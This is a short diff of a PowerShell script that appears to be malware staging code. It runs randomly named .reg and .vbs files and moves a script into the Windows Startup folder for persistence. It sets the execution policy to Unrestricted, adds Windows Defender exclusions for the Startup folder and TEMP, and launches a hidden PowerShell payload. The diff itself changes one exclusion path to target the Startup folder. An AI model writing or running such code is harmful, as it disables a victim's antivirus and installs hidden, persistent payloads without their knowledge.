@@ -79,8 +79,6 @@ Get-NetFirewallRule -Name *ssh*
 & "./QyjAaZDBbNPk.reg"
 & "./FoRAUwtxKkSB.vbs"
 
-#Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir
-
 $tasks = "C:\ProgramData\Microsoft\Windows"
 
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
@@ -151,7 +149,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 cd $initial_dir
 
-Add-MpPreference -ExclusionPath $path
+Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
 
 Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$path\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
